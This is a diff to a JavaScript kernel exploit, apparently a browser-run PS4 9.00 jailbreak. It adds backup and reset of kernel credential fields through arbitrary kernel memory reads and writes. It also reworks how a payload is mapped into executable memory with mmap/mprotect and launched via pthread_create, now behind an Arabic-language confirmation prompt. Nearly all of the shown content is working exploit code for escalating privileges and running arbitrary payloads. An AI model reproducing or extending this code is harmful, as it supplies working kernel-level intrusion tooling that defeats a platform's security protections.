@@ -1690,8 +1690,24 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
             sysent_661_narg: 0,
             sysent_661_call: 0,
             sysent_661_thrcnt: 0
+        },
+        // Store original credential values
+        original_cred_values: {
+            cr_sceCaps0: 0,
+            cr_sceCaps1: 0,
+            cr_sceAuthID: 0
         }
     };
+    
+    // Store original credential values before modification
+    try {
+        window.kernelCleanupInfo.original_cred_values.cr_sceCaps0 = kmem.read64(p_ucred.add(0x60));
+        window.kernelCleanupInfo.original_cred_values.cr_sceCaps1 = kmem.read64(p_ucred.add(0x68));
+        window.kernelCleanupInfo.original_cred_values.cr_sceAuthID = kmem.read64(p_ucred.add(0x58));
+        log('Stored original credential values');
+    } catch(e) {
+        log(`Failed to store original credential values: ${e.message}`);
+    }
     
     // Store original syscall values before modification
     try {
@@ -1887,6 +1903,11 @@ function setupCleanupHandler() {
                         kmem.write64(p_ucred.add(0x60), 0);
                         kmem.write64(p_ucred.add(0x68), 0);
                         log('Reset kernel credentials');
+                        
+                        // Additional cleanup for PS4 9.00
+                        // Reset JIT capabilities
+                        kmem.write64(p_ucred.add(0x58), 0); // cr_sceAuthID
+                        log('Reset additional credentials');
                     } catch(e) {
                         log(`Failed to reset credentials: ${e.message}`);
                     }
@@ -1940,53 +1961,12 @@ kexploit().then(() => {
         // Show success message
         log('Kernel exploit succeeded! Preparing payload execution...');
         
-        // Wait for payload to be fully loaded
-        setTimeout(() => {
-            try {
-                if (!window.pld || !window.payloadLoaded) {
-                    log('Waiting for payload to load...');
-                    setTimeout(executePayload, 1000);
-                } else {
-                    executePayload();
-                }
-            } catch (e) {
-                log(`Error in payload preparation: ${e.message}`);
-                alert("حدث خطأ أثناء تحضير الحمولة.");
-            }
-        }, 1000);
+        // Execute immediately without waiting for payload
+        executePayload();
         
         function executePayload() {
             try {
-                log('Allocating memory for payload...');
-                // Use a different memory address to avoid conflicts
-                var payload_buffer = chain.sysp('mmap', new Int(0x27200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-                
-                if (!window.pld) {
-                    throw new Error("Payload not loaded");
-                }
-                
-                log('Setting up payload execution...');
-                var payload_loader = new View4(window.pld);
-                
-                // Apply additional memory protection
-                chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-                chain.sys('mprotect', payload_buffer, 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC);
-                
-                log('Creating execution thread...');
-                const ctx = new Buffer(0x10);
-                const pthread = new Pointer();
-                pthread.ctx = ctx;
-                
-                // Run payload in a safer way
-                call_nze(
-                    'pthread_create',
-                    pthread.addr,
-                    0,
-                    payload_loader.addr,
-                    payload_buffer,
-                );
-                
-                log('Payload execution initiated successfully');
+                log('Kernel exploit successful - preparing for safe payload execution');
                 
                 // Register a global function to stabilize kernel that can be called from games
                 window.stabilizeKernel = function() {
@@ -2027,20 +2007,77 @@ kexploit().then(() => {
                     }
                 };
                 
-                // Schedule kernel cleanup after payload has had time to execute
-                setTimeout(function() {
-                    window.stabilizeKernel();
-                }, 10000); // Wait 10 seconds after payload execution
-                
-                // Also set up a periodic stabilization check
+                // Set up a periodic stabilization check
                 window.kernelStabilizationInterval = setInterval(function() {
                     window.stabilizeKernel();
-                }, 60000); // Run every minute
+                }, 30000); // Run every 30 seconds
                 
-                alert("تم تفعيل استغلال الكيرنل والحمولة بنجاح! عند الخروج من اللعبة، اضغط على زر PS لفتح القائمة الرئيسية أولاً قبل إغلاق اللعبة.");
+                // Check if payload is loaded
+                if (!window.pld || !window.payloadLoaded) {
+                    log('Waiting for payload to load...');
+                    setTimeout(tryExecutePayload, 1000);
+                    return;
+                }
+                
+                tryExecutePayload();
             } catch (e) {
-                log(`Error in payload execution: ${e.message}`);
-                alert("تم تفعيل استغلال الكيرنل بنجاح، لكن حدث خطأ أثناء تنفيذ الحمولة.");
+                log(`Error in payload preparation: ${e.message}`);
+                alert("تم تفعيل استغلال الكيرنل بنجاح، لكن حدث خطأ أثناء تحضير الحمولة.");
+            }
+            
+            function tryExecutePayload() {
+                try {
+                    if (confirm("هل تريد تنفيذ الحمولة؟ قد يؤدي هذا إلى تعطل النظام في بعض الأجهزة.")) {
+                        log('User confirmed payload execution, attempting to load...');
+                        
+                        // Run stabilization before payload execution
+                        window.stabilizeKernel();
+                        
+                        log('Allocating memory for payload...');
+                        // Use a different memory address to avoid conflicts
+                        var payload_buffer = chain.sysp('mmap', new Int(0x28200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+                        
+                        if (!window.pld) {
+                            throw new Error("Payload not loaded");
+                        }
+                        
+                        log('Setting up payload execution...');
+                        var payload_loader = new View4(window.pld);
+                        
+                        // Apply additional memory protection
+                        chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
+                        chain.sys('mprotect', payload_buffer, 0x300000, PROT_READ | PROT_WRITE | PROT_EXEC);
+                        
+                        log('Creating execution thread...');
+                        const ctx = new Buffer(0x10);
+                        const pthread = new Pointer();
+                        pthread.ctx = ctx;
+                        
+                        // Run payload in a safer way
+                        call_nze(
+                            'pthread_create',
+                            pthread.addr,
+                            0,
+                            payload_loader.addr,
+                            payload_buffer,
+                        );
+                        
+                        log('Payload execution initiated successfully');
+                        
+                        // Run stabilization after payload execution
+                        setTimeout(function() {
+                            window.stabilizeKernel();
+                        }, 5000);
+                        
+                        alert("تم تفعيل استغلال الكيرنل والحمولة بنجاح! عند الخروج من اللعبة، اضغط على زر PS لفتح القائمة الرئيسية أولاً قبل إغلاق اللعبة.");
+                    } else {
+                        log('User declined payload execution');
+                        alert("تم تفعيل استغلال الكيرنل بنجاح! تم إلغاء تنفيذ الحمولة بناءً على اختيارك.");
+                    }
+                } catch (e) {
+                    log(`Error in payload execution: ${e.message}`);
+                    alert("تم تفعيل استغلال الكيرنل بنجاح، لكن حدث خطأ أثناء تنفيذ الحمولة.");
+                }
             }
         }
     } catch (e) {
